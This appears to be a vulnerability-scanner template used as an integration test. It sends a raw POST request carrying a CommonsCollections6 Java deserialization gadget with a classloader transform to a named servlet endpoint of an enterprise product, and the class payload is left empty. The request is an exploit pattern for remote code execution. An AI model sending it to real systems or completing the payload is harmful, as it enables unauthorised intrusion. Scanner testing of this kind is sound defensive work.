id: test-dsl-deseriialization-classloader

info:
  name: RAW Template with DSL Deserialization classloader
  author: gongjl
  severity: info

http:
  - raw:
      # Note for the integration test: dsl expression should not contain commas
      - |
        POST /servlet/~ic/com.ufsoft.iufo.jiuqi.JiuQiClientReqDispatch HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream
        gadget: CommonsCollections6 classloader

        {{base64_decode(generate_java_gadget_ext("CommonsCollections6", "Transform", "mozilla_defining_class_loader", "{\"base64Class\":\"\"}", "base64-raw"))}}
